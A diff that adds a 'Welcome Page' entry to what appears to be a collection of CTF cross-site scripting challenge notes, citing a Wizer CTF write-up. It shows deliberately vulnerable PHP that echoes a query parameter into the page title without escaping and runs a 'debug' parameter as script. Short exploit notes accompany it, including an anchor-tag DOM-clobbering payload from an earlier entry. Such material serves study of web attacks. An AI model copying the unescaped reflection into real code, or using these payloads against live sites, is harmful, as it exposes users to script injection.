@@ -868,3 +868,43 @@ window.onload = function() {
 ```
 <a id=CONFIG></a><a id=CONFIG name=url href='URL'>
 ```
+
+
+### Welcome Page
+
+#### Reference
++ https://wizer-ctf.com/writeups/ctf3.html	
+
+#### Vulnerable Code
+```
+<?php
+$nonce = md5(random_bytes(32));
+header("Content-Security-Policy: script-src 'nonce-$nonce'");
+?>
+<head>
+    <meta charset="UTF-8">
+    <title>
+        <?php echo 'Welcome ' . ($_GET['name'] ?? "") ?>
+    </title>
+    <script nonce="<?php echo $nonce ?>">
+        window.environment = 'production';
+    </script>
+</head>
+<body>
+<script nonce="<?php echo $nonce ?>">
+    if (window.environment && window.environment !== 'production') {
+        let debug = new URL(location)
+            .searchParams.get('debug') || '';
+        const script = document.createElement('script');
+        script.nonce = "<?php echo $nonce ?>";
+        script.innerText = debug;
+        document.body.appendChild(script);
+    }
+</script>
+</body>
+```
+
+#### Exploit
+```
+window.environment
+```
